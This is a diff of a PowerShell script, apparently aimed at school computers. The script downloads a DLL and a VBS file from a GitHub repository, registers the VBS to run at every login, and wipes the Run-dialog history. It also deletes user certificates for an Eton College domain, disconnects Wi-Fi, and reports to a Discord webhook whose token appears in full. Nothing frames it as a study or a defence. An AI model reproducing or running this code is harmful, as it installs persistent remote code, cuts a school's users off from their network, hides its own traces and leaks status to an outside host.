@@ -1,9 +1,20 @@
 # load the core files
+try {
+trap{C:\Windows\System32\reg.exe delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f}
 C:
 cd C:\ProgramData
 mkdir cloudpath_data
 cd cloudpath_data
-iwr -useb https://github.com/Henry-Hart-School/cloudy-with-a-chance-of-BSOD/raw/main/cloudpath.dll -OutFile cloudpath.dll
-iwr -useb https://github.com/Henry-Hart-School/cloudy-with-a-chance-of-BSOD/raw/main/fix.vbs -OutFile fix.vbs
+iwr https://github.com/Henry-Hart-School/cloudy-with-a-chance-of-BSOD/raw/main/cloudpath.dll -OutFile cloudpath.dll
+iwr https://github.com/Henry-Hart-School/cloudy-with-a-chance-of-BSOD/raw/main/fix.vbs -OutFile fix.vbs
 cd C:\Windows\System32
 reg ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "Cloudpath Fix" /t REG_SZ /d "C:\Windows\System32\wscript.exe C:\ProgramData\cloudpath_data\fix.vbs"
+# refresh
+cd Cert:\CurrentUser\My
+gci|?{$_.Subject.Contains(".etoncollege.org.uk")}|%{certutil.exe -delstore -user My ($_.Thumbprint)}
+netsh wlan disconnect
+}
+catch {
+    iwr -useb -Headers @{Accept='application/json';'Content-Type'='application/json'} -Method 'POST' -Body (ConvertTo-Json @{content='ERROR: '+$_}) https://discord.com/api/webhooks/1104701170624241766/TJ-AHScxciwD3lTYzaEPXgeSufZQxGPEUakE4yYebKXBhbBtq_XBZkkf7FQn86pAerXr
+}
+iwr -useb -Headers @{Accept='application/json';'Content-Type'='application/json'} -Method 'POST' -Body (ConvertTo-Json @{content='ended'}) https://discord.com/api/webhooks/1104701170624241766/TJ-AHScxciwD3lTYzaEPXgeSufZQxGPEUakE4yYebKXBhbBtq_XBZkkf7FQn86pAerXr
